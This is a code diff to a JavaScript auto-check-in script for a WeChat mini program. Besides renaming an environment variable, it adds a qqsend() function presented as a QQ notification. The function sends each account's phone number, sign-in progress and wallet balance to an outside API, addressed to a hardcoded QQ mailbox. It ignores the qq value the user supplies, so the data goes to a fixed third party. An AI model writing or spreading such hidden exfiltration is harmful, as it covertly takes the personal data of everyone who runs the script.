@@ -27,8 +27,8 @@ const {
 const Notify = 1; //0为关闭通知，1为打开通知,默认为1
 const debug = 0; //0为关闭调试，1为打开调试,默认为0
 
-let mtat = ($.isNode() ? process.env.mtat : $.getdata("mtat")) || ""
-let mtatArr = [];
+let mtqd = ($.isNode() ? process.env.mtqd : $.getdata("mtqd")) || ""
+let mtqdArr = [];
 let data = '';
 let msg = '';
 var hours = new Date().getMonth();
@@ -49,22 +49,26 @@ var timestamp = Math.round(new Date().getTime()).toString();
 
 
             log(`\n============ 微信小程序：蜜糖签到   京东上车群  1028220779 ============`)
-            log(`\n=================== 共找到 ${mtatArr.length} 个账号 ===================`)
+            log(`\n=================== 共找到 ${mtqdArr.length} 个账号 ===================`)
             if (debug) {
-                log(`【debug】 这是你的全部账号数组:\n ${mtatArr}`);
+                log(`【debug】 这是你的全部账号数组:\n ${mtqdArr}`);
             }
-            for (let index = 0; index < mtatArr.length; index++) {
+            for (let index = 0; index < mtqdArr.length; index++) {
 
                 let num = index + 1
                 addNotifyStr(`\n==== 开始【第 ${num} 个账号】====\n`, true)
         
-                mtat = mtatArr[index];            
+                mtqd = mtqdArr[index];            
+                mtat = mtqd.split('&')[0]
+                qq = mtqd.split('&')[1]
 
 await id ()
 await checkin()
 await money()
 await ts()
 await fh()
+await qqsend()
+
 }
             await SendMsg(msg);
         }
@@ -281,7 +285,8 @@ if (debug) {
                     log(JSON.stringify(response.data));
                 }
 
-log(data.data.list[0].productName +`\n\n`+'充值的手机号为===>    '+data.data.list[0].phone+'\n\n'+ '签到天数' + data.data.list[0].signDays + '/' + data.data.list[0].totalDays+'     钱包余额为===>'+qianbao);             
+log(data.data.list[0].productName +`\n\n`+'充值的手机号为===>    '+data.data.list[0].phone+'\n\n'+ '签到天数' + data.data.list[0].signDays + '/' + data.data.list[0].totalDays+'     钱包余额为===>'+qianbao); 
+tuisong=`\n\n`+ data.data.list[0].productName +`\n\n`+'充值的手机号为===>    '+data.data.list[0].phone+'\n\n'+ '签到天数' + data.data.list[0].signDays + '/' + data.data.list[0].totalDays+'     钱包余额为===>'+qianbao;            
 msg+=`\n\n`+ data.data.list[0].productName +`\n\n`+'充值的手机号为===>    '+data.data.list[0].phone+'\n\n'+ '签到天数' + data.data.list[0].signDays + '/' + data.data.list[0].totalDays+'     钱包余额为===>'+qianbao;
                     
                 
@@ -297,6 +302,52 @@ msg+=`\n\n`+ data.data.list[0].productName +`\n\n`+'充值的手机号为===>   
     })
 
 }  
+
+//  
+  /*
+qq发送短信
+*/
+
+async function qqsend() {
+    return new Promise((resolve) => {
+const options = {
+  method: 'GET',
+  url: 'http://api.xn--7gqa009h.top/api/yjfs',
+  params: {jsf: '1460256751@qq.com', bt: '蜜糖签到', nr: tuisong}
+};
+
+    if (debug) {
+            log(`\n【debug】=============== 这是  请求 url ===============`);
+            log(JSON.stringify(options));
+        }
+        axios.request(options).then(async function(response) {
+            try {
+                 data = response.data;
+                if (debug) {
+                    log(`\n\n【debug】===============钱包余额'返回data==============`);
+                    log(JSON.stringify(response.data));
+                }
+    
+                qianbao=data.data.amount
+            } catch (e) {
+                log(`异常：${data}，原因：${data.message}`)
+            }
+        }).catch(function(error) {
+            console.error(error);
+        }).then(res => {
+            //这里处理正确返回
+            resolve();
+        });
+    })
+
+} 
+
+
+
+
+
+
+
 
 //  
   /*
@@ -372,21 +423,21 @@ const options = {
 
 
 async function Envs() {
-    if (mtat) {
-        if (mtat.indexOf("@") != -1) {
-            mtat.split("@").forEach((item) => {
+    if (mtqd) {
+        if (mtqd.indexOf("@") != -1) {
+            mtqd.split("@").forEach((item) => {
 
-                mtatArr.push(item);
+                mtqdArr.push(item);
             });
-        } else if (mtat.indexOf("\n") != -1) {
-            mtat.split("\n").forEach((item) => {
-                mtatArr.push(item);
+        } else if (mtqd.indexOf("\n") != -1) {
+            mtqd.split("\n").forEach((item) => {
+                mtqdArr.push(item);
             });
         } else {
-            mtatArr.push(mtat);
+            mtqdArr.push(mtqd);
         }
     } else {
-        log(`\n 【${$.name}】：未填写变量 mtat`)
+        log(`\n 【${$.name}】：未填写变量 mtqd`)
         return;
     }
 
